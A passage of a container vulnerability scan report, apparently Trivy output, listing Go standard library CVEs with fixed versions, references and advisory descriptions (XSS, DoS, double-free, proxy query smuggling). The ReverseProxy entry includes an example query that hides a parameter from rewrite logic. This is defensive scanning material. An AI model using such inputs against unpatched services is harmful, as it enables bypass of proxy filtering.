│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5689aee4f053205578881b015f4ac10d258379cabc55862117aa79c1850f809b 
│     │      ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │      │                   inside of a <meta> tag's <content> attribute. If the URL content were to
│     │      │                   insert ASCII whitespaces around the '=' rune inside of the <content>
│     │      │                   attribute, the escaper would fail to similarly escape it, leading to XSS. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │      │                  ├ [1]: https://go.dev/issue/78913 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [22] ╭ VulnerabilityID : CVE-2026-39825 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:84d136dc6d23b80f485abdf9fa842df1107bcec1f7cf1ab582872898f56ed9c0 
│     │      ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │      │                   functions. When used with a Rewrite function, or a Director function which
│     │      │                   parses query parameters, ReverseProxy sanitizes the forwarded request to
│     │      │                   remove query parameters which are not parsed by url.ParseQuery. ReverseProxy
│     │      │                   does not take ParseQuery's limit on the total number of query parameters
│     │      │                   (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit
│     │      │                   ReverseProxy to forward a request containing a query parameter that is not
│     │      │                   visible to the Rewrite function. For example, the query
│     │      │                   "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while
│     │      │                   hiding it from the proxy's Rewrite function. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │      │                  ├ [1]: https://go.dev/issue/78948 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [23] ╭ VulnerabilityID : CVE-2026-39826 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:dd9a2341ac1615d3d2e94ff62a816685233c0317ed2bf30033e729804f5ec4b9 
│     │      ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │      │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │      │                    of the template would incorrectly escape any data passed into the <script>
│     │      │                   block. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │      │                  ├ [1]: https://go.dev/issue/78981 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [24] ╭ VulnerabilityID : CVE-2026-39836 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:d70a3b41c7e92bbd0ccc52c30fc39dc151b5dcf0c32b685b2c8d98a3c0ea675d 
│     │      ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │      │                    containing a NUL (0). 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │      │                  ├ [1]: https://go.dev/issue/79006 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [25] ╭ VulnerabilityID : CVE-2026-42499 
│            ├ VendorIDs        ─ [0]: GO-2026-4977 
│            ├ PkgID           : stdlib@v1.26.1 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│            │                  ╰ UID : ffd28a2ad639e9f9 
│            ├ InstalledVersion: v1.26.1 
│            ├ FixedVersion    : 1.25.10, 1.26.3 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:15e9ea0eb0fce2894040efce94a42560d4b725db4102919c34ddfe599265e6be 
│            ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│            ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
│            │                   email address according to RFC 5322. 
│            ├ Severity        : UNKNOWN 
│            ├ References       ╭ [0]: https://go.dev/cl/771520 
│            │                  ├ [1]: https://go.dev/issue/78987 
│            │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│            │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│            ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│            ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
╰ [8] ╭ [0] ╭ VulnerabilityID : CVE-2026-33811 
      │     ├ VendorIDs        ─ [0]: GO-2026-4981 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:4fd61036b4075c3488fab7f6340c11256264951bacc72f555a0703a6f2f93d0e 
      │     ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
      │     ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
      │     │                   can trigger a double-free of C memory and a crash. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/767860 
      │     │                  ├ [1]: https://go.dev/issue/78803 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
      │     ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
      │     ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
      ├ [1] ╭ VulnerabilityID : CVE-2026-33814 
      │     ├ VendorIDs        ─ [0]: GO-2026-4918 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:45052f3d43759279f497292574b5f22cc523ccf2f9b91318be0f9c9d8a4526f6 
      │     ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
      │     ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
      │     │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
      │     │                   value of 0. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/761581 
      │     │                  ├ [1]: https://go.dev/cl/761640 
      │     │                  ├ [2]: https://go.dev/issue/78476 
      │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
      │     ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
      │     ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
      ├ [2] ╭ VulnerabilityID : CVE-2026-39820 
      │     ├ VendorIDs        ─ [0]: GO-2026-4986 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:dcb99222f7749e4473758c5b34088a8dca11e28ef5fc2cbcec819d5d554ea165 
      │     ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
      │     ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate were
      │     │                    able to trigger excessive CPU exhaustion and memory allocations. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/759940 
      │     │                  ├ [1]: https://go.dev/issue/78566 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
      │     ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
      │     ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
      ├ [3] ╭ VulnerabilityID : CVE-2026-39823 
      │     ├ VendorIDs        ─ [0]: GO-2026-4982 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:7c644eb679fc936e5e85d04764e1035b30e5b8cf55a7dbe2bf7d51e1caf28ddd 
      │     ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
      │     ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
      │     │                   inside of a <meta> tag's <content> attribute. If the URL content were to insert
      │     │                    ASCII whitespaces around the '=' rune inside of the <content> attribute, the
      │     │                   escaper would fail to similarly escape it, leading to XSS. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/769920 
      │     │                  ├ [1]: https://go.dev/issue/78913 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
      │     ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
      │     ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
      ├ [4] ╭ VulnerabilityID : CVE-2026-39825 
      │     ├ VendorIDs        ─ [0]: GO-2026-4976 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:afc540c78c6e13ef28f8171a57ddd461072224072ed5164cd089fcb91ada6c48 
      │     ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
      │     ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
      │     │                   functions. When used with a Rewrite function, or a Director function which
      │     │                   parses query parameters, ReverseProxy sanitizes the forwarded request to remove
      │     │                    query parameters which are not parsed by url.ParseQuery. ReverseProxy does not
      │     │                    take ParseQuery's limit on the total number of query parameters (controlled by
      │     │                    GODEBUG=urlmaxqueryparams=N) into account. This can permit ReverseProxy to
      │     │                   forward a request containing a query parameter that is not visible to the
      │     │                   Rewrite function. For example, the query "a1=x&a2=x&...&a10000=x&hidden=y" can
      │     │                   forward the parameter "hidden=y" while hiding it from the proxy's Rewrite
      │     │                   function. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/770541 
      │     │                  ├ [1]: https://go.dev/issue/78948 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
      │     ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
      │     ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
      ├ [5] ╭ VulnerabilityID : CVE-2026-39826 
      │     ├ VendorIDs        ─ [0]: GO-2026-4980 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:a7984d87c221dbe4631c0b5fba83a95fb209c371e93087ded0b6117a8292ecc5 
      │     ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
      │     ├ Description     : If a trusted template author were to write a <script> tag containing an empty
      │     │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
      │     │                   of the template would incorrectly escape any data passed into the <script>
      │     │                   block. 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/771180 
      │     │                  ├ [1]: https://go.dev/issue/78981 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
      │     ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
      │     ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
      ├ [6] ╭ VulnerabilityID : CVE-2026-39836 
      │     ├ VendorIDs        ─ [0]: GO-2026-4971 
      │     ├ PkgID           : stdlib@v1.26.2 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
      │     │                  ╰ UID : d1d69e031af00a85 
      │     ├ InstalledVersion: v1.26.2 
      │     ├ FixedVersion    : 1.25.10, 1.26.3 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
      │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:e08c7915da53ee7113234755024594e9e8c6ac1e26d560c4bd37c74d2bd025c5 
      │     ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
      │     ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
      │     │                   containing a NUL (0). 
      │     ├ Severity        : UNKNOWN 
      │     ├ References       ╭ [0]: https://go.dev/cl/775320 
      │     │                  ├ [1]: https://go.dev/issue/79006 
      │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
      │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
      │     ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
      │     ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
      ╰ [7] ╭ VulnerabilityID : CVE-2026-42499 
            ├ VendorIDs        ─ [0]: GO-2026-4977 
            ├ PkgID           : stdlib@v1.26.2 
            ├ PkgName         : stdlib 
            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
            │                  ╰ UID : d1d69e031af00a85 
            ├ InstalledVersion: v1.26.2 
            ├ FixedVersion    : 1.25.10, 1.26.3 
            ├ Status          : fixed 
            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
            ├ DataSource       ╭ ID  : govulndb 
            │                  ├ Name: The Go Vulnerability Database 
            │                  ╰ URL : https://pkg.go.dev/vuln/ 
            ├ Fingerprint     : sha256:e27fb205c404ae0efaff3ded93e53496ab9ee44221ec42eaace5cdb8cc2aa7f7 
            ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
            ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an email
            │                    address according to RFC 5322. 
            ├ Severity        : UNKNOWN 
            ├ References       ╭ [0]: https://go.dev/cl/771520 
            │                  ├ [1]: https://go.dev/issue/78987 
            │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
            │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
            ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
            ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
```
